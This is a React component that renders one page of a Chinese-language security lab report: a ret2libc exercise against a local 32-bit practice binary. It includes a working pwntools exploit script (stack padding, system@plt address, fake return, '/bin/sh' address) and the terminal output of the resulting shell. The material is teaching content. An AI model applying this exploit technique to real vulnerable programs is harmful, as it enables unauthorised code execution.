import React from 'react';
import { A4Page } from '../shared';
import { KaliTerminal } from './Lab3Part1';

// 实验四 第八部分 - ret2libc 类型1 exp 和结果
export const Lab4Part8: React.FC = () => (
    <A4Page id="lab4-part8">
        <p className="text-sm mb-2">步骤2：编写 exp 脚本</p>
        <p className="text-sm mb-3 text-justify leading-relaxed indent-8">
            ret2libc 攻击的核心思想是：当函数返回时，程序会从栈上取出返回地址并跳转执行。
            如果我们将返回地址覆盖为 system 函数的地址，程序就会跳转到 system 函数。
            在 32 位 x86 架构中，函数调用使用 cdecl 调用约定，参数从右到左压栈。
            因此，我们的 payload 布局应该是：padding + system地址 + 假返回地址 + "/bin/sh"地址。
        </p>

        <KaliTerminal>
{`# ret2libc.py
from pwn import *

context(arch = "i386", os = "linux")
p = process("./ret2libc")

system_plt = 0x08049050
sh_addr = 0x0804c020
padding = 0x10 + 4

payload = b"A" * padding + p32(system_plt) + p32(0xdeadbeef) + p32(sh_addr)

p.sendlineafter(b"input:", payload)
p.interactive()`}
        </KaliTerminal>

        <p className="text-sm mb-2">步骤3：运行 exp 脚本</p>
        <KaliTerminal>
{`┌──(kali㉿kali)-[~/lab4]
└─$ python3 ret2libc.py
[+] Starting local process './ret2libc': pid 271234
[*] Switching to interactive mode
$ whoami
kali
$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali)
$ exit
[*] Stopped process './ret2libc' (pid 271234)`}
        </KaliTerminal>

        <p className="text-sm mb-3 text-justify leading-relaxed indent-8">
            ret2libc 类型1 攻击成功。成功利用程序中已有的 system 函数和 "/bin/sh" 字符串获取了 shell。
        </p>
    </A4Page>
);

export default Lab4Part8;
